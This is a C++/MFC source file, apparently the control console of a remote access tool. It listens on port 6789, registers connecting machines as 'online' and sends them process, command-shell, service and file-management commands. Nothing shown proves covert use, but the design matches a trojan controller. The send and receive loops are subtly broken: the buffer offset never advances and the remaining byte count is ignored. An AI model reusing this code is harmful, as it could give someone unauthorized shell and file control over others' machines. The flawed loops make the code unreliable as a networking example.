#include "StdAfx.h"
#include "ClientSock.h"
#include "RemoteClientView.h"
#include "MainFrm.h"


CArray<ServItem, ServItem&> m_ServArray;
UINT m_MyPort = 0;

CClientSock::CClientSock(void)
{
}

CClientSock::~CClientSock(void)
{
}

SOCKET CClientSock::MyBindSock(UINT Port)
{
	/*初始化*/
	SOCKET sk = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sk == INVALID_SOCKET)
	{
		AfxMessageBox(_T("初始化socket失败!"));
		return INVALID_SOCKET;
	}

	/*绑定*/
	sockaddr_in baddr;
	baddr.sin_family = AF_INET;
	baddr.sin_port = htons(Port);
	baddr.sin_addr.S_un.S_addr = INADDR_ANY;
	if (SOCKET_ERROR == bind(sk, (sockaddr*)&baddr, sizeof(sockaddr_in)))
	{
		AfxMessageBox(_T("绑定socket失败!"));
		closesocket(sk);
		return INVALID_SOCKET;
	}

	/*监听*/
	if (SOCKET_ERROR == listen(sk, SOMAXCONN))
	{
		AfxMessageBox(_T("监听socket失败!"));
		closesocket(sk);
		return INVALID_SOCKET;
	}

	return sk;
}

UINT __cdecl CClientSock::MyControllingFuction(LPVOID pParam)
{
	CRemoteClientView *pthis = (CRemoteClientView *)pParam;

	/////初始化网络套接字socket/////
	if (m_MyPort == 0)
	{
		m_MyPort = 6789;
	}
	SOCKET sk = pthis->m_clientsock.MyBindSock(m_MyPort);
	///*初始化*/
	/*SOCKET sk = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sk == INVALID_SOCKET)
	{
		AfxMessageBox(_T("初始化socket失败!"));
		return 0;
	}*/

	///*绑定*/
	//sockaddr_in baddr;
	//baddr.sin_family = AF_INET;
	//baddr.sin_port = htons(6789);
	//baddr.sin_addr.S_un.S_addr = INADDR_ANY;
	//if (SOCKET_ERROR == bind(sk, (sockaddr*)&baddr, sizeof(sockaddr_in)))
	//{
	//	AfxMessageBox(_T("绑定socket失败!"));
	//	closesocket(sk);
	//	return 0;
	//}

	/*监听*/
	//if (SOCKET_ERROR == listen(sk, SOMAXCONN))
	//{
	//	AfxMessageBox(_T("监听socket失败!"));
	//	closesocket(sk);
	//	return 0;
	//}

	if (sk == INVALID_SOCKET)
	{
		AfxMessageBox(_T("绑定失败！"));
		return 0;
	}
	/*接受*/
	while(1)
	{
		if (pthis->m_clientsock.MySelect(sk))
		{
			sockaddr_in acaddr;
			int aint = sizeof(sockaddr_in);
			SOCKET accsock = accept(sk, (sockaddr*)&acaddr, &aint);
			if (INVALID_SOCKET == accsock)
			{
				AfxMessageBox(_T("接受socket失败!"));
				closesocket(accsock);
				continue;
			}
			//AfxMessageBox(_T("accept success!"));
			ServItem sitem;
			sitem.sk = accsock;
			sitem.ip = inet_ntoa(acaddr.sin_addr);
			int p = -1;
			if (!pthis->m_clientsock.IsExist(sitem.ip, p))
			{
				continue;
			}
			
			int idx = m_ServArray.Add(sitem);
			AfxBeginThread(pthis->m_clientsock.MyRecvFuction, (LPVOID)&m_ServArray.GetAt(idx));
		}
		Sleep(100);
	}
	
	return 0;
}

BOOL CClientSock::MySelect(SOCKET sk)
{
	fd_set fs;
	FD_ZERO(&fs);
	FD_SET(sk,&fs);
	timeval tv;
	tv.tv_sec = 0;
	tv.tv_usec =1000;
	int bse = 0;
	bse = select(0,&fs,0,0,&tv); //可读
	if (bse<=0)
	{
		return FALSE;
	}
	else if (FD_ISSET(sk,&fs))
	{
		return TRUE;
	}
	return FALSE;
}

BOOL CClientSock::MySendCommond(SOCKET sk, int Id, char *text, int size, int fd)
{
	COMMEND cmd;
	ZeroMemory(&cmd, COMSIZE);
	cmd.ID = Id;
	if (text != NULL)
	{
		memcpy(cmd.teste, text, size);
	}
	cmd.fID = fd;

	char *buf = new char[COMSIZE];
	ZeroMemory(buf, COMSIZE);
	memcpy(buf, &cmd, COMSIZE);
	int nleft = COMSIZE;
	int idx = 0;
	while(nleft > 0)
	{
		int dx = send(sk, &buf[idx], COMSIZE, 0);
		if (dx == SOCKET_ERROR)
		{
			return FALSE;
		}
		nleft = nleft - dx;
		idx += idx;
	}
	delete []buf;

	return TRUE;
}

BOOL CClientSock::MyRecvCommond(SOCKET sk, COMMEND &cmd)
{
	ZeroMemory(&cmd, COMSIZE);

	char *buf = new char[COMSIZE];
	ZeroMemory(buf, COMSIZE);

	int nleft = COMSIZE;
	int idx = 0;
	while(nleft > 0)
	{
		int dx = recv(sk, &buf[idx], COMSIZE, 0);
		if (dx == SOCKET_ERROR)
		{
			return FALSE;
		}
		nleft = nleft - dx;
		idx += idx;
	}
	memcpy(&cmd, buf, COMSIZE);
	delete []buf;

	return TRUE;
}

UINT __cdecl CClientSock::MyRecvFuction(LPVOID pParam)
{
	ServItem sitem = *(ServItem*)pParam;
	CMainFrame *pFram = (CMainFrame*)AfxGetApp()->m_pMainWnd;
	CRemoteClientView *pView = (CRemoteClientView*)pFram->GetActiveView();
	pView->m_clientsock.MySendCommond(sitem.sk, MYGETSYSINFO, NULL, 0);
	Sleep(1000);
	while(1)
	{
		int idx = -1;
		if (pView->m_clientsock.MySelect(sitem.sk))
		{
			COMMEND commend;
			ZeroMemory(&commend, COMSIZE);
			if (!pView->m_clientsock.MyRecvCommond(sitem.sk, commend))
			{
				pView->m_clientsock.IsExist(sitem.ip, idx);
				AfxMessageBox(_T("用户下线^_^"));
				closesocket(sitem.sk);
				pView->SendMessage(WM_OFFLINE, 0, (LPARAM)idx);
				return 0;
			}
			
			//命令转发
			switch(commend.ID)
			{
				case MYGETSYSINFO:
					AfxMessageBox(_T("用户上线^_^"));
					pView->m_clientsock.IsExist(sitem.ip, idx);
					SYSINFO info;
					memcpy(&info, &commend.teste, sizeof(SYSINFO));
					m_ServArray.GetAt(idx).cmpname = info.cmpname;
					m_ServArray.GetAt(idx).memsize = info.memsize;
					m_ServArray.GetAt(idx).os = info.OS;
					pView->SendMessage(WM_ONLINE, (WPARAM)&m_ServArray.GetAt(idx), (LPARAM)idx);
					break;
				case MYGETPROCESS:
					pView->m_Process->ProcessCommend(commend);
					break;
				case MYCMDSHELL:
					pView->m_CmdShell->CmdCommend(commend);
					break;
				case MYSVCMANAGE:
					pView->m_SvcManage->MySvcCommend(commend);
					break;
				case MYFILEMANAGE:
					pView->m_FileManage->MyFileCommend(commend);
					break;
				default:
					break;
			}
		}
	}

	return 0;
}
BOOL CClientSock::IsExist(CString ip, int & idx)
{
	for (int i = 0; i < m_ServArray.GetCount(); i++)
	{
		if (ip == m_ServArray.GetAt(i).ip)
		{
			idx = i;
			return FALSE;
		}
	}
	return TRUE;
}



